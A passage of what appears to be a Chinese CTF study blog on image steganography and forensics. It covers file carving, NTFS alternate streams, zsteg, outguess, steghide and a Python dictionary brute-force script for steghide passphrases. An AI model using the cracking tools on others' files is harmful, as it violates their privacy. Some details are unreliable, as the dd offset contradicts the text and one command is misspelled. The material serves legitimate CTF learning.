class="number">16</span>))</span><br><span class="line">        img_obj.putpixel((x,y),(r,g,b))</span><br><span class="line"></span><br><span class="line">img_obj.save(<span class="string">&#x27;ok.png&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="Binwalk"><a href="#Binwalk" class="headerlink" title="Binwalk"></a>Binwalk</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># binwalk flag.jpg</span><br></pre></td></tr></table></figure><p>binwalk自动分析文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># binwalk flag.jpg</span></span><br><span class="line"> </span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line"><span class="number">0</span>             <span class="number">0x0</span>             JPEG image data, JFIF standard <span class="number">1.01</span></span><br><span class="line"><span class="number">382</span>           <span class="number">0x17E</span>           Copyright string: <span class="string">&quot;Copyright (c) 1998 Hewlett-Packard Company&quot;</span></span><br><span class="line"><span class="number">3192</span>          <span class="number">0xC78</span>           TIFF image data, big-endian, offset of first image directory: <span class="number">8</span></span><br><span class="line"><span class="number">140147</span>        <span class="number">0x22373</span>         JPEG image data, JFIF standard <span class="number">1.01</span></span><br><span class="line"><span class="number">140177</span>        <span class="number">0x22391</span>         TIFF image data, big-endian, offset of first image directory: <span class="number">8</span></span><br></pre></td></tr></table></figure><p>jpg文件还隐藏着另一个jpg文件，从140147块偏移开始就是另一张jpg。</p><h4 id="使用dd命令分离"><a href="#使用dd命令分离" class="headerlink" title="使用dd命令分离"></a>使用dd命令分离</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># dd if&#x3D;flag.jpg of&#x3D;flag-1.jpg skip&#x3D;28673 bs&#x3D;1</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>是指定输入文件</span><br><span class="line">of是指定输出文件</span><br><span class="line">skip是指定从输入文件开头跳过<span class="number">140147</span>个块后再开始复制</span><br><span class="line">bs设置每次读写块的大小为<span class="number">1</span>字节</span><br></pre></td></tr></table></figure><h4 id="使用foremost工具分离"><a href="#使用foremost工具分离" class="headerlink" title="使用foremost工具分离"></a>使用foremost工具分离</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foremost flag.jpg</span><br></pre></td></tr></table></figure><h3 id="JPHS"><a href="#JPHS" class="headerlink" title="JPHS"></a>JPHS</h3><p>针对jpg行为，有时候需要密码，有时候直接空密码。</p><h3 id=""><a href="#" class="headerlink" title=""></a><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/4.png" alt="4"></h3><h3 id="盲水印"><a href="#盲水印" class="headerlink" title="盲水印"></a>盲水印</h3><h4 id="普通盲水印"><a href="#普通盲水印" class="headerlink" title="普通盲水印"></a>普通盲水印</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 bwmforpy3.py decode hui.png hui_with_wm.png wm_from_hui.png --oldseed</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bwm.py 程序文件python2版本</span><br><span class="line">bwmforpy3.py 程序文件python3版本</span><br><span class="line">hui.png 无水印的原图</span><br><span class="line">wm.png 水印图</span><br><span class="line">hui_with_wm.png 有盲水印的图</span><br><span class="line">wm_from_hui.png 反解出来的水印图</span><br></pre></td></tr></table></figure><h4 id="频域盲水印"><a href="#频域盲水印" class="headerlink" title="频域盲水印"></a>频域盲水印</h4><p>脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python pinyubwm.py --original 1.png --image 2.png --result out.png</span><br></pre></td></tr></table></figure><h3 id="NTFS隐写"><a href="#NTFS隐写" class="headerlink" title="NTFS隐写"></a>NTFS隐写</h3><p>NTFS交换数据流（alternate data streams，简称ADS）是NTFS磁盘格式的一个特性，在NTFS文件系统下，每个文件都可以存在多个数据流，就是说除了主文件流之外还可以有许多非主文件流寄宿在主文件流中。它使用资源派生来维持与文件相关的信息，虽然我们无法看到数据流文件，但是它却是真实存在于我们的系统中的。创建一个数据交换流文件的方法很简单，命令为”宿主文件:准备与宿主文件关联的数据流文件”。</p><p>利用方式</p><p>使用winrar解压文件，然后使用工具扫描，会直接看到解压的文件。一定要先使用winrar解压文件。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/6.png" alt="6"></p><p>可以使用工具对文件进行检测，查看是否存在ntfs隐写。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">F:\CTF-tools\NTFS&gt;lads.exe /S</span><br><span class="line"></span><br><span class="line">LADS - Freeware version <span class="number">4.10</span></span><br><span class="line">(C) Copyright <span class="number">1998</span><span class="number">-2007</span> Frank Heyne Software (http://www.heysoft.de)</span><br><span class="line">This program lists files <span class="keyword">with</span> alternate data streams (ADS)</span><br><span class="line">Use LADS on your own risk!</span><br><span class="line"></span><br><span class="line">Scanning directory F:\CTF-tools\NTFS\ <span class="keyword">with</span> subdirectories</span><br><span class="line"></span><br><span class="line">      size  ADS <span class="keyword">in</span> file</span><br><span class="line">----------  ---------------------------------</span><br><span class="line">        <span class="number">23</span>  F:\CTF-tools\NTFS\a.jpg:flag1.txt</span><br><span class="line">      <span class="number">1064</span>  F:\CTF-tools\NTFS\a.jpg:Zone.Identifier</span><br><span class="line"></span><br><span class="line">      <span class="number">1087</span> bytes <span class="keyword">in</span> <span class="number">2</span> ADS listed</span><br></pre></td></tr></table></figure><p>或者使用cmd命令来查看是否存在隐写</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">F:\CTF-tools\NTFS&gt;dir /r</span><br><span class="line"> 驱动器 F 中的卷是 新加卷</span><br><span class="line"> 卷的序列号是 BE8A<span class="number">-2731</span></span><br><span class="line"></span><br><span class="line"> F:\CTF-tools\NTFS 的目录</span><br><span class="line"></span><br><span class="line"><span class="number">2020</span>/<span class="number">10</span>/<span class="number">27</span>  <span class="number">11</span>:<span class="number">19</span>    &lt;DIR&gt;          .</span><br><span class="line"><span class="number">2020</span>/<span class="number">10</span>/<span class="number">27</span>  <span class="number">11</span>:<span class="number">19</span>    &lt;DIR&gt;          ..</span><br><span class="line"><span class="number">2020</span>/<span class="number">02</span>/<span class="number">17</span>  <span class="number">16</span>:<span class="number">09</span>            <span class="number">31</span>,<span class="number">469</span> a.jpg</span><br><span class="line">                                 <span class="number">23</span> a.jpg:flag1.txt:$DATA</span><br><span class="line">                              <span class="number">1</span>,<span class="number">064</span> a.jpg:Zone.Identifier:$DATA</span><br><span class="line"><span class="number">2007</span>/<span class="number">01</span>/<span class="number">04</span>  <span class="number">04</span>:<span class="number">10</span>            <span class="number">61</span>,<span class="number">952</span> lads.exe</span><br><span class="line"><span class="number">2020</span>/<span class="number">10</span>/<span class="number">22</span>  <span class="number">14</span>:<span class="number">50</span>           <span class="number">952</span>,<span class="number">930</span> ntfsstreamseditor.exe</span><br><span class="line"><span class="number">2007</span>/<span class="number">04</span>/<span class="number">27</span>  <span class="number">10</span>:<span class="number">17</span>            <span class="number">87</span>,<span class="number">424</span> streams.exe</span><br><span class="line"><span class="number">2020</span>/<span class="number">10</span>/<span class="number">27</span>  <span class="number">11</span>:<span class="number">15</span>         <span class="number">3</span>,<span class="number">403</span>,<span class="number">439</span> test.mp4</span><br><span class="line">                                <span class="number">131</span> test.mp4:Zone.Identifier:$DATA</span><br><span class="line"><span class="number">2020</span>/<span class="number">10</span>/<span class="number">27</span>  <span class="number">11</span>:<span class="number">19</span>         <span class="number">3</span>,<span class="number">379</span>,<span class="number">226</span> test.rar</span><br><span class="line">               <span class="number">6</span> 个文件      <span class="number">7</span>,<span class="number">916</span>,<span class="number">440</span> 字节</span><br><span class="line">               <span class="number">2</span> 个目录 <span class="number">82</span>,<span class="number">187</span>,<span class="number">112</span>,<span class="number">448</span> 可用字节</span><br></pre></td></tr></table></figure><p>然后可以使用工具进行数据提取，7z压缩工具可以看到是否有隐写数据。</p><h4 id="notepad"><a href="#notepad" class="headerlink" title="notepad"></a>notepad</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">notepad 1.txt:flag.txt</span><br></pre></td></tr></table></figure><p>直接可以看到文件，可以使用<code>strings</code>命令来查看是否有ntfs隐写。</p><h3 id="stegdetect"><a href="#stegdetect" class="headerlink" title="stegdetect"></a>stegdetect</h3><p><code>stegdetect</code>可以检测jpg通过<code>JSteg</code>、<code>JPHide</code>、<code>OutGuess</code>、<code>Invisible Secrets</code>、<code>F5</code>、<code>appendX</code>和<code>Camouflage</code>等这些隐写。</p><p>检测隐写方式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">检查jpg图片隐写方法_win</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">stegdetect.exe -tjopi -s 10.0 [stego_file]</span><br><span class="line"></span><br><span class="line">-s 修改检测算法的敏感度，该值的默认值为1。检测结果的匹配度与检测算法的敏感度成正比，算法敏感度的值越大，检测出的可疑文件包含敏感信息的可能性越大。</span><br><span class="line">-t 设置要检测哪些隐写工具（默认检测jopi），可设置的选项如下：</span><br><span class="line">j 检测图像中的信息是否是用jsteg嵌入的。</span><br><span class="line">o 检测图像中的信息是否是用outguess嵌入的。</span><br><span class="line">p 检测图像中的信息是否是用jphide嵌入的。</span><br><span class="line">i 检测图像中的信息是否是用invisible secrets嵌入的。</span><br></pre></td></tr></table></figure><p>暴力破解密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python steg_brute.py -b -d [字典] -f [jpg_file]</span><br></pre></td></tr></table></figure><p>stegbreak</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">stegbreak -r rules.ini -f password.txt -t p [stego_file]</span><br><span class="line"># password.txt为自带字典</span><br><span class="line">Loaded 1 files...</span><br><span class="line">[stego_file]：jphide[v5](2333)</span><br><span class="line"># 2333为该文件jphide的密码</span><br></pre></td></tr></table></figure><h3 id="stegpy"><a href="#stegpy" class="headerlink" title="stegpy"></a>stegpy</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;home&#x2F;steady&#x2F;.local&#x2F;bin&#x2F;stegpy &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;1.webp -p</span><br></pre></td></tr></table></figure><p>提取信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stegpy _image.png</span><br></pre></td></tr></table></figure><p>带口令提取信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stegpy _image.png -p</span><br></pre></td></tr></table></figure><h3 id="outguess"><a href="#outguess" class="headerlink" title="outguess"></a>outguess</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">加密：</span><br><span class="line">outguess -k “my secret key” -d hidden.txt demo.jpg out.jpg</span><br><span class="line">加密之后，demo.jpg会覆盖out.jpg,</span><br><span class="line">hidden.txt中的内容是要隐藏的东西</span><br><span class="line"></span><br><span class="line">解密：</span><br><span class="line">outguess -k 123456 -r 4.jpg hidden.txt</span><br><span class="line">解密之后，解密内容放在hidden.txt中</span><br></pre></td></tr></table></figure><h3 id="F5隐写"><a href="#F5隐写" class="headerlink" title="F5隐写"></a>F5隐写</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">F5隐写加密：</span><br><span class="line">java Embed 原图片.jpg 生成的图片.jpg -e 隐藏的文件.txt -p 密码</span><br><span class="line">F5隐写解密：</span><br><span class="line">java Extract 生成的图片.jpg -p 密码</span><br></pre></td></tr></table></figure><h3 id="图片十六进制处理"><a href="#图片十六进制处理" class="headerlink" title="图片十六进制处理"></a>图片十六进制处理</h3><p>比如直接逆序十六进制，或者与其他数据异或，这里可以借助winhex功能。</p><h3 id="zsteg"><a href="#zsteg" class="headerlink" title="zsteg"></a>zsteg</h3><p>zsteg可以检测PNG和BMP图片里的隐写数据。</p><h4 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ zsteg 1.bmp --bits 1 --channel r --lsb --order xy --limit 2048</span><br><span class="line">$ zsteg 1.bmp --bits 1 --channel g --lsb --order xy --limit 2048</span><br><span class="line">$ zsteg 1.bmp --bits 1 --channel b --lsb --order xy --limit 2048</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">--bits 1：每次只摘取颜色通道中的第 1 个比特。</span><br><span class="line">--channel r：只摘取红色通道的比特位。</span><br><span class="line">--lsb：按最低有效位优先的顺序进行摘取。</span><br><span class="line">--order xy：按照从左至右、从上至下的顺序对图像素点进行摘取。</span><br><span class="line">--limit 2048：最多摘取输出 2048 字节。</span><br></pre></td></tr></table></figure><h4 id="导出文件"><a href="#导出文件" class="headerlink" title="导出文件"></a>导出文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zsteg -e &quot;b1,bgr,lsb,xy&quot; pcat.png &gt; p.exe</span><br></pre></td></tr></table></figure><h4 id="显示细节"><a href="#显示细节" class="headerlink" title="显示细节"></a>显示细节</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~&#x2F;桌面&#x2F;steady$ zsteg &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;output&#x2F;png&#x2F;hide.png -v</span><br><span class="line">b2,bgr,msb,xy       .. text: &quot;Wz]Wz]iz&quot;</span><br><span class="line">    00000000: 74 9a 5e 29 cf f3 a9 c0  a7 fc 75 5d 82 90 a6 57  |t.^)......u]...W|</span><br><span class="line">    00000010: 7a 5d 57 7a 5d 69 7a ed  c4 3c 77 5d 37 23 26 d2  |z]Wz]iz..&lt;w]7#&amp;.|</span><br><span class="line">    00000020: cd 5d 67 76 b1 47 2e 24  e9 2d f1 42 c6 8b 47 92  |.]gv.G.$.-.B..G.|</span><br><span class="line">    00000030: 2e 41 ec fb ee 12 ae eb  46 84 bb 47 11 e1 ee 04  |.A......F..G....|</span><br><span class="line">    00000040: 11 11 44 44 44 44 e4 ba  71 4c 92 6a 45 ad d4 fa  |..DDDD..qL.jE...|</span><br><span class="line">    00000050: 57 a3 dd 2c 8b c0 0b a8  d5 5b c2 c5 5f 57 ba 9c  |W..,.....[.._W..|</span><br><span class="line">    00000060: b1 61 18 96 35 a0 70 c9  e6 39 8b b3 28 00 a8 aa  |.a..5.p..9..(...|</span><br><span class="line">    00000070: aa aa 3f 50 01 95 aa 0e  fd 77 1c ff ff 57 e9 29  |..?P.....w...W.)|</span><br><span class="line">    00000080: ff ed c8 f4 7d 6b 18 ec  61 b4 53 cb 25 26 d2 75  |....&#125;k..a.S.%&amp;.u|</span><br><span class="line">    00000090: cb 22 73 5d a7 bf bb ab  bf f3 9c 78 a9 65 0d 02  |.&quot;s].......x.e..|</span><br><span class="line">    000000a0: 1f 11 9e 32 0c e2 ad 07  18 f9 5a c9 3c 7b 14 97  |...2......Z.&lt;&#123;..|</span><br><span class="line">    000000b0: bd 38 ee d9 09 89 b3 9d  e9 29 a7 62 4c 9b a3 8b  |.8.......).bL...|</span><br><span class="line">    000000c0: 15 17 f8 7c 0a bd e2 7d  8b 65 39 b0 36 17 86 96  |...|...&#125;.e9.6...|</span><br><span class="line">    000000d0: e5 31 2d 9a bc a9 70 2b  eb 08 a8 17 0f 85 5b 8b  |.1-...p+......[.|</span><br><span class="line">    000000e0: 81 f6 2d f8 54 7b e4 c7  01 c3 1e 69 db 15 50 a9  |..-.T&#123;.....i..P.|</span><br><span class="line">    000000f0: a3 8d d9 df c7 4a c3 a0  eb ba be fa c7 c1 1e 6a  |.....J.........j|</span><br></pre></td></tr></table></figure><h4 id="查看LSB信息"><a href="#查看LSB信息" class="headerlink" title="查看LSB信息"></a>查看LSB信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zsteg flag.png</span><br></pre></td></tr></table></figure><p>第二个参数就是rgb，这里只有r，代表红色的0号通道藏有PNG，我们打开stegsolve的red 0通道可以看到有PNG信息。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">b1,r,lsb,xy         .. file: PNG image data, <span class="number">526</span> x <span class="number">298</span>, <span class="number">8</span>-bit/color RGB, non-interlaced</span><br><span class="line">b1,bgr,msb,xy       .. text: <span class="string">&quot;C2dB2IH&amp;$&quot;</span></span><br></pre></td></tr></table></figure><p>提取图片中的信息</p><p>有时候我们直接提取会提取出一半数据，这时候我们直接使用-l参数设置我们提取信息的长度。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zsteg warmup.bmp b1,r,lsb,xy -l 2048</span><br></pre></td></tr></table></figure><h4 id="all参数"><a href="#all参数" class="headerlink" title="--all参数"></a><code>--all</code>参数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@root:~&#x2F;桌面&#x2F;flag&#x2F;套娃# zsteg &#39;&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;套娃&#x2F;2&#x2F;3&#x2F;4&#x2F;5&#x2F;6&#x2F;warmup.bmp&#39; --all</span><br></pre></td></tr></table></figure><h3 id="ImageMagick"><a href="#ImageMagick" class="headerlink" title="ImageMagick"></a>ImageMagick</h3><p>ImageMagick是一个免费的开源，功能丰富，基于文本和跨平台的图像处理工具，用于创建，编辑，编写或转换位图图像。 它可在Linux，Windows，Mac Os X，iOS，Android OS和许多其他操作系统上运行。</p><h4 id="identify"><a href="#identify" class="headerlink" title="identify"></a>identify</h4><h5 id="提取每一帧的间隔"><a href="#提取每一帧的间隔" class="headerlink" title="提取每一帧的间隔"></a>提取每一帧的间隔</h5><p>间隔时间转成0或者1，拿到flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">identify -format &quot;%T\n&quot; *.gif&gt;1.txt</span><br></pre></td></tr></table></figure><h5 id="查看图片详情"><a href="#查看图片详情" class="headerlink" title="查看图片详情"></a>查看图片详情</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">identify example.png</span><br></pre></td></tr></table></figure><p>从指定文件中获取缩略图：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~&#x2F;桌面&#x2F;steady&#x2F;output&#x2F;jpg$ exiftool -b -ThumbnailImage &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;hekkerman.jpg&gt; thumbnail.jpg </span><br></pre></td></tr></table></figure><h3 id="steghide"><a href="#steghide" class="headerlink" title="steghide"></a>steghide</h3><h4 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h4><p>多用于jpg文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steghide.exe extract -sf flag.jpg</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steghide extract -sf 1.jpg -p 123456</span><br></pre></td></tr></table></figure><h4 id="破解密码"><a href="#破解密码" class="headerlink" title="破解密码"></a>破解密码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python steg_brute.py -b -d [字典] -f [jpg_file]</span><br></pre></td></tr></table></figure><p>或者–kali有文件夹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span>():</span></span><br><span class="line">    stegoFile=<span class="string">&#x27;thing.jpg&#x27;</span></span><br><span class="line">    extractFile=<span class="string">&#x27;hide.txt&#x27;</span></span><br><span class="line">    passFile=<span class="string">&#x27;english.dic&#x27;</span></span><br><span class="line"></span><br><span class="line">    errors=[<span class="string">&#x27;could not extract&#x27;</span>,<span class="string">&#x27;steghide --help&#x27;</span>,<span class="string">&#x27;Syntax error&#x27;</span>]</span><br><span class="line">    cmdFormat=<span class="string">&#x27;steghide extract -sf &quot;%s&quot; -xf &quot;%s&quot; -p &quot;%s&quot;&#x27;</span></span><br><span class="line">    f=open(passFile,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        cmd=cmdFormat %(stegoFile,extractFile,line.strip())</span><br><span class="line">        p=Popen(cmd,shell=<span class="literal">True</span>,stdout=PIPE,stderr=STDOUT)</span><br><span class="line">        content=unicode(p.stdout.read(),<span class="string">&#x27;gbk&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> err <span class="keyword">in</span> errors:</span><br><span class="line">            <span class="keyword">if</span> err <span class="keyword">in</span> content:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span> content,</span><br><span class="line">            <span class="keyword">print</span> <span class="string">&#x27;the passphrase is %s&#x27;</span> %(line.strip())</span><br><span class="line">            f.close()</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    foo()</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&#x27;ok&#x27;</span></span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h4 id="stegcracker"><a href="#stegcracker" class="headerlink" title="stegcracker"></a>stegcracker</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~&#x2F;桌面$ &#x2F;home&#x2F;steady&#x2F;.local&#x2F;bin&#x2F;stegcracker</span><br></pre></td></tr></table></figure><p>有时候也可以破解音频。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~&#x2F;桌面&#x2F;steady$ steghide extract -sf out.wav</span><br><span class="line">Enter passphrase: </span><br><span class="line">wrote extracted data to &quot;download.txt&quot;.</span><br></pre></td></tr></table></figure><h3 id="stepic"><a href="#stepic" class="headerlink" title="stepic"></a>stepic</h3><p>提取数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~$ stepic --decode --image-in&#x3D;&#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;1.png --out&#x3D;output.txt</span><br></pre></td></tr></table></figure><p>转jpg</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~&#x2F;桌面&#x2F;steady$ stepic -i &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;output&#x2F;png&#x2F;00001069.png -d &gt; thing</span><br></pre></td></tr></table></figure><h3 id="stegoveritas"><a href="#stegoveritas" class="headerlink" title="stegoveritas"></a>stegoveritas</h3><p>一键查看文件信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;home&#x2F;steady&#x2F;.local&#x2F;bin&#x2F;stegoveritas flag.jpg</span><br></pre></td></tr></table></figure><h3 id="extundelete"><a href="#extundelete" class="headerlink" title="extundelete"></a>extundelete</h3><p>恢复文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extundelete --restore-all corrupt-file.img</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">恢复&#x2F;dev&#x2F;sda5中所有数据</span><br><span class="line">xtundelete &#x2F;dev&#x2F;sda5 --restore-all </span><br></pre></td></tr></table></figure><h3 id="两张相似的图片"><a href="#两张相似的图片" class="headerlink" title="两张相似的图片"></a>两张相似的图片</h3><p>Beyond Compare 4工具</p><p>stegsolve异或</p><p>盲水印</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kali compare 1.jpg 2.jpg out.jpg</span><br></pre></td></tr></table></figure><h3 id="chunk块中藏有信息"><a href="#chunk块中藏有信息" class="headerlink" title="chunk块中藏有信息"></a>chunk块中藏有信息</h3><p>CRC块中有可打印字符，正常的CRC应该是六个字节，三个十六进制数。比如，C4ED3H。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/57.png" alt="57"></p><h3 id="IDAT标识缺少"><a href="#IDAT标识缺少" class="headerlink" title="IDAT标识缺少"></a>IDAT标识缺少</h3><p>如果png图片模糊，可能缺少<code>IDAT</code>标识，放入01也会提示，<code>*ERROR: CRC Mismatch @ chunk[2]; in data: f4ff7854; expected: 0761f34a</code>。</p><p>01提示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*ERROR: CRC Mismatch @ chunk[2]; in data: f4ff7854; expected: 0761f34a</span><br><span class="line">*ERROR: CRC Mismatch @ chunk[3]; in data: 80a3b703; expected: a4d05483</span><br><span class="line">*ERROR: CRC Mismatch @ chunk[29]; in data: 00000000; expected: 5808f045</span><br></pre></td></tr></table></figure><p>在工作区查看遍历。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/55.png" alt="55"></p><p><code>IDAT</code>十六进制标识为：<code>49 44 41 